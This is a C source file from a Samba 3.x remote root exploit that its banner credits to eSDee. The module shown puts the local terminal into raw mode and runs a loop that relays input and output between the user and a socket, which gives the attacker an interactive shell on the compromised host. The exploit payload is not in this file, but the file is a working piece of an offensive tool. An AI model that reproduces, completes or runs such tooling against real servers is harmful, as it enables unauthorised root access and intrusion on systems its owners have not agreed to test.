/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <fcntl.h>
#include <errno.h>

#include "ansi.h"
#include "term.h"
#include "mode.h"

struct termios term_org;
struct termios term_new;

void
term_set_terminal(void)
{
        /* Disables local echo, canonical input, signals, etc. taken from tinyshell. */

        if (!MODE_IS_SET(MODE_COOKED)) {


                if (tcgetattr(STDOUT_FILENO, &term_org) < 0) {
                        perror("tcgetattr");
                        exit(EXIT_FAILURE);
                }

                memcpy(&term_new, &term_org, sizeof(struct termios));

                term_new.c_iflag |= IGNPAR;
                term_new.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
                term_new.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
                term_new.c_oflag &= ~OPOST;

                term_new.c_cc[VMIN]  = 1;
                term_new.c_cc[VTIME] = 0;

                if (tcsetattr(STDOUT_FILENO, TCSADRAIN, &term_new) < 0) {
                        perror("tcsetattr");
                        exit(EXIT_FAILURE);
                }

                if (MODE_IS_SET(MODE_VERBOSE)) fprintf(stdout, "set_terminal: Terminal switched to raw mode.\r\n");
        }

        return;
}

void
term_restore_terminal(void)
{
        /* Restores the original terminal flags. */

        if (!MODE_IS_SET(MODE_COOKED)) {
                if (tcsetattr(STDOUT_FILENO, TCSADRAIN, &term_org) < 0) {
                        fprintf(stderr, "restore_terminal: failed.\n");
                        exit(EXIT_FAILURE);
                }

                if (MODE_IS_SET(MODE_VERBOSE)) fprintf(stdout, "restore_terminal: Terminal restored.\r\n");
        }

        return;
}

void
term_handle_shell(int fd)
{
        unsigned char recv_buf[RECVBUF_SIZE];

        int n   = 1;
        int ret = 0;

        fd_set fds;

        fprintf(stdout, NO);
        fflush(stdout);

        memset(recv_buf, '\0', sizeof(recv_buf));

        while(n) {
                FD_ZERO(&fds);
                FD_SET(0, &fds);
                FD_SET(fd, &fds);

                ret = select(FD_SETSIZE, &fds, NULL, NULL, NULL);

                if (ret < 0) {
                        close(fd);
                        term_restore_terminal();
                        perror("select");
                        exit(EXIT_FAILURE);
                }

                if (FD_ISSET(STDIN_FILENO, &fds)) {

                        if((n = read(STDIN_FILENO, recv_buf, sizeof(recv_buf))) < 1) {
                                if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                else
                                        break;
                        }

                        if((n = write(fd, recv_buf, n)) < 1) {
                                if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                else
                                        break;
                        }
                }

                if (FD_ISSET(fd, &fds)) {
                        if((n = read(fd, recv_buf, sizeof(recv_buf))) < 1) {
                                if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                else
                                        break;
                        }

                        if((n = write(STDOUT_FILENO, recv_buf, n)) < 1) {
                                if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                else
                                        break;
                        }

                }

        }

        fprintf(stdout, GR"\r\n["LG"!"GR"] "LG"Connection closed."NO"\r\n");

        close(fd);
        term_restore_terminal();
        exit(EXIT_FAILURE);
}
